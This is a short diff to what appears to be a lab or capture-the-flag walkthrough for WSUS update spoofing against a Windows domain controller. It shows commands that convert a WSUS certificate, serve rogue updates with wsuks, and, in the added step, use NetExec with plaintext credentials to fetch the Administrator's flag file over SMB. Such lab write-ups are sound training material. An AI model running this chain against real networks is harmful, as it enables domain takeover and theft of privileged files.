@@ -31,6 +31,8 @@
 11. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
 12. `sudo wsuks --WSUS-Server 192.168.109.10 --tls-cert wsus.pem --serve-only`
 13. Wait up to 5 minutes for WSUS updates on the DC.
+14. `nxc smb 192.168.109.10 -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
+
 
 
 #### Manual invocations
